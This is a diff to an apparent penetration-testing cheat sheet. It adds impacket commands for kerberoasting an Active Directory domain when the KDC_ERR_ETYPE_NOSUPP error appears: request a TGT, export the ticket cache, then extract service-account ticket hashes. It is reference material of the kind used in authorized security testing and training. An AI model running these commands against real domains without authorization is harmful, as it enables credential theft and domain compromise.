@@ -73,6 +73,23 @@ $ sudo crackmapexec smb DC_IP -u DOMAIN_ADMIN_USER -p DOMAIN_ADMIN_PASSWORD
 > [!Note]
 > If we have gain domain admin rights, we can authenticate against the DC
 
+**Error KDC_ERR_ETYPE_NOSUPP**
+
+1. Request a TGT for the current domain user:
+```bash
+$ impacket-getTGT -dc-ip DC_IP DOMAIN_FQDN/USER:'PASSWORD'
+```
+
+2. Export the kerberos environment variable to point to the TGT:
+```bash
+export KRB5CCNAME=USER.ccache 
+```
+
+3. Perform the kerberoasting attack:
+```bash
+$ impacket-GetUserSPNs -k -no-pass -dc-ip DC_IP -request DOMAIN_FQDN/USER
+```
+
 ---
 # Kerberoasting - from Windows
 
